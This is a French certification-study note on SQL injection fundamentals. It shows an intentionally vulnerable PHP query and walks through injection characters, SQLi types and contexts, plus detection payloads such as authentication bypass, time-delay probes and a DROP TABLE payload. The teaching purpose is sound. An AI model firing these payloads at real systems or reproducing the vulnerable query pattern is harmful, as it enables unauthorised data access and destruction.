# 🔴 Module 15 — Concepts Fondamentaux : SQL Injection

> **CEH v13 | EC-Council**  
> `#SQLi` `#SQL` `#Parsing` `#InBand` `#OutOfBand` `#Inferential`

---

## 📌 Table des matières

1. [Qu'est-ce que l'injection SQL ?](#1-quest-ce-que-linjection-sql)
2. [Comment fonctionne le parsing SQL](#2-parsing-sql)
3. [Types d'injection selon la communication](#3-types-selon-communication)
4. [Contextes d'injection](#4-contextes-dinjection)
5. [Identifier un point d'injection](#5-identifier-un-point)

---

## 1. Qu'est-ce que l'Injection SQL ?

L'injection SQL est une vulnérabilité permettant à un attaquant d'interférer avec les requêtes SQL effectuées par une application.

```
Code PHP vulnérable :
$username = $_GET['user'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query);

Requête normale (user=alice) :
  SELECT * FROM users WHERE username = 'alice'
  → Retourne les infos d'Alice ✓

Requête injectée (user=' OR '1'='1) :
  SELECT * FROM users WHERE username = '' OR '1'='1'
  → 1=1 est toujours vrai → Retourne TOUS les utilisateurs !

Requête dévastatrice (user='; DROP TABLE users;--) :
  SELECT * FROM users WHERE username = ''; DROP TABLE users;--'
  → Supprime la table users !
```

---

## 2. Comment Fonctionne le Parsing SQL

```
Caractères clés pour l'injection :

'  (apostrophe) → Ferme une chaîne de caractères
"  (guillemet)  → Ferme une chaîne de caractères
;  (point-virg) → Termine une instruction SQL (stacked queries)
-- (double tiret)→ Commentaire SQL (MySQL, MSSQL)
#  (hash)       → Commentaire SQL (MySQL uniquement)
/* */ (bloc)    → Commentaire multi-ligne

Tester un point d'injection :
  Input normal : alice
  Input test   : alice' → Si erreur SQL = vulnérable !
  Input test   : alice'' → Si fonctionne = la quote est bien interprétée

Erreurs révélatrices :
  MySQL   : "You have an error in your SQL syntax"
  MSSQL   : "Unclosed quotation mark after the character string"
  Oracle  : "ORA-01756: quoted string not properly terminated"
  SQLite  : "unrecognized token"
```

---

## 3. Types Selon la Communication

```
┌─────────────────────────────────────────────────────────────┐
│                    TYPES DE SQLi                            │
├─────────────────────┬───────────────────────────────────────┤
│ IN-BAND             │ Données extraites dans la même réponse│
│ ├── Error-based     │ Via messages d'erreur SQL             │
│ └── Union-based     │ Via clause UNION SELECT               │
├─────────────────────┼───────────────────────────────────────┤
│ INFERENTIAL (Blind) │ Pas de données dans la réponse        │
│ ├── Boolean-based   │ Déduction par true/false              │
│ └── Time-based      │ Déduction par délai de réponse        │
├─────────────────────┼───────────────────────────────────────┤
│ OUT-OF-BAND (OOB)   │ Données exfiltrées via autre canal    │
│                     │ (DNS, HTTP vers serveur externe)      │
└─────────────────────┴───────────────────────────────────────┘
```

---

## 4. Contextes d'Injection

### Dans une clause WHERE (le plus courant)

```sql
-- Requête originale :
SELECT * FROM products WHERE category='Electronics' AND active=1

-- Injection dans category :
-- Payload : Electronics' --
SELECT * FROM products WHERE category='Electronics' --' AND active=1
→ Le reste de la requête est commenté → Récupère les produits inactifs aussi
```

### Dans un ORDER BY

```sql
-- Requête originale :
SELECT * FROM products ORDER BY price ASC

-- Injection dans la colonne de tri :
-- Payload : 1 UNION SELECT ...
SELECT * FROM products ORDER BY price ASC UNION SELECT ...
```

### Dans un INSERT

```sql
-- Requête originale :
INSERT INTO users (name, email) VALUES ('Alice', 'alice@email.com')

-- Payload dans le champ name :
-- Alice', 'attacker@evil.com') --
INSERT INTO users (name, email) VALUES ('Alice', 'attacker@evil.com') --', 'alice@email.com')
```

---

## 5. Identifier un Point d'Injection

### Tests basiques

```
Étape 1 : Soumettre des caractères spéciaux
  '                           → SQL error ?
  ''                          → Double quote → Fonctionne ?
  `                           → Backtick (MySQL) → SQL error ?
  "                           → Double quote → SQL error ?

Étape 2 : Tests de logique booléenne
  ' OR 1=1 --                 → Tous les résultats ?
  ' OR 1=2 --                 → Aucun résultat ?
  Si oui → SQL injection booléenne confirmée

Étape 3 : Tests temporels
  ' OR SLEEP(5) --            → Délai de 5 secondes ?
  '; WAITFOR DELAY '0:0:5'--  → Délai MSSQL ?

Étape 4 : Confirmation
  admin'--                    → Login sans mot de passe ?
```

---

## 🧠 Points clés à retenir pour l'examen

- SQLi = l'une des vulnérabilités web les plus graves et répandues
- **In-band** = réponse dans la même connexion (error-based, union-based)
- **Inferential/Blind** = pas de données directes (boolean, time-based)
- **Out-of-band** = données exfiltrées via DNS/HTTP externe
- `'` = caractère clé pour tester une injection
- `--` et `#` = commentaires SQL pour ignorer la fin de requête

---

*⬅️ [README](./README.md) | ➡️ [Types de SQLi](./02_types_sqli.md)*
